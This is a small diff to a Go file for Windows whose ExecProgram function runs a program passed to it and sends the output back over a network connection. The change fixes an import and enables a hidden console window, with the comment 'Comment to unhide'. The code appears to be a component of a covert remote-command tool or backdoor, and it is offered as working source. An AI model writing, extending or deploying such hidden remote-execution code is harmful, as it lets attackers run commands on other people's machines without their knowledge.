@@ -1,11 +1,10 @@
-
 // +build windows
 
 package execute
 
 import (
-	"exec"
 	"net"
+	"os/exec"
 	"syscall"
 )
 
@@ -15,7 +14,7 @@ func ExecProgram(conn net.Conn, program string) {
 
 	// Windows command execute
 	cmd := exec.Command(program)
-	#cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true} # Uncomment to hide
+	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true} // Comment to unhide
 	out, _ := cmd.Output()
 	conn.Write([]byte(out))
 
